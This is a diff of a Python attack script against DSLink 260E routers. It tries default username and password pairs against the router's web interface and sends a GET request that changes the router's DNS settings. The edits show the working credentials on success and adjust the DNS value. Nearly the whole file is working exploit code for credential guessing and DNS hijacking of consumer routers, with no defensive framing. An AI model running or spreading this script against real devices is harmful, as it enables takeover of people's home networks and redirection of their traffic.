@@ -3,12 +3,13 @@
 #Author: Jhonathan Davi jhoon | insightsecs at gmail.com | Twitter @jh00nbr
 #Inurl Brasil: blog.inurl.com.br | fb.com/InurlBrasil
 
-#DSLink 260E - Defaut Passwords DNS Change
+#DSLink 260E - Defaut Password DNS Change
 #Changing DNS through GET method with default password.
 
 import requests
 import os
 import sys
+import base64
 
 class bcolors:
     OKGREEN = '\033[92m'
@@ -29,10 +30,10 @@ for user in ["admin", "root", "Administrator", "ctbc", "", "user", "support", "a
    for passwd in ["", "root","teste","admin", "user", "1234", "1212", "supportuser", "s85Tcf", "normaluser", "parks", "Administrator", "administrator"]:
        try:
            ip = sys.argv[1]
-           get = requests.get("http://"+ ip + "/Action?dns_status=1&dns_poll_timeout=2&id=57&dns_server_ip_1=8&dns_server_ip_2=8&dns_server_ip_3=8&dns_server_ip_4=8&priority=1&cmdAdd=Add", auth=(user, passwd))
+           get = requests.get("http://"+ ip + "/Action?dns_status=1&dns_poll_timeout=2&id=57&dns_server_ip_1=8&dns_server_ip_2=8&dns_server_ip_3=8&dns_server_ip_4=4&priority=1&cmdAdd=Add", auth=(user, passwd))
 
            if get.status_code == 200:
-               print bcolors.OKGREEN + "\n[+]" + bcolors.ENDC + " DNS changed success in: " + ip + "\n"
+               print bcolors.OKGREEN + "\n[+]" + bcolors.ENDC + " DNS changed success in: " + ip + " | " + bcolors.OKGREEN + user + "@" + passwd + bcolors.ENDC+ "\n"
                sys.exit(1)
        except requests.ConnectionError:
            print "Failed connection"
